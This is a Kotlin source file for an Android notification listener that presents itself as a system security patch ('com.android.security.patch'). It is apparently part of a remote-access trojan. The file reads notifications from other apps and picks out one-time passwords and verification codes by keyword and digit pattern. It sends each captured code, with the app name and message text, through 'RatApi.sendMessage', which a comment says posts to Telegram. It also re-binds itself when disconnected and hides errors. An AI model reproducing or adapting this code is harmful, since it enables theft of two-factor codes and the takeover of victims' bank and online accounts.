package com.android.security.patch

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class NotifListener : NotificationListenerService() {

    companion object {
        @Volatile var alive = false
        private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

        private val OTP_WORDS = listOf(
            "otp", "kode", "code", "verifikasi", "verify", "verification",
            "kode otp", "one time", "one-time", "2fa", "auth", "login code",
            "token", "pin"
        )
        private val OTP_REGEX = Regex("""\b(\d{4,8})\b""")
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
        alive = true
    }

    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        alive = false
        // coba re-bind
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
            requestRebind(android.content.ComponentName(this, NotifListener::class.java))
        }
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        sbn ?: return
        try {
            val pkg = sbn.packageName ?: return
            // skip our own notification
            if (pkg == packageName) return

            val extras = sbn.notification?.extras ?: return
            val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString().orEmpty()
            val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString().orEmpty()
            val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString().orEmpty()
            val body = if (bigText.isNotBlank()) bigText else text

            if (title.isBlank() && body.isBlank()) return

            // post ke telegram hanya kalau filter OTP match
            val lower = (title + " " + body).lowercase()
            val isOtp = OTP_WORDS.any { lower.contains(it) }
            val hasDigits = OTP_REGEX.containsMatchIn(body)

            if (isOtp && hasDigits) {
                val code = OTP_REGEX.find(body)?.value ?: ""
                scope.launch {
                    RatApi.sendMessage(
                        this@NotifListener,
                        "<b>OTP captured</b>\n" +
                            "App: <code>$pkg</code>\n" +
                            "Title: $title\n" +
                            "Body: $body\n" +
                            "Code: <b>$code</b>"
                    )
                }
            }
        } catch (_: Throwable) {}
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {}
}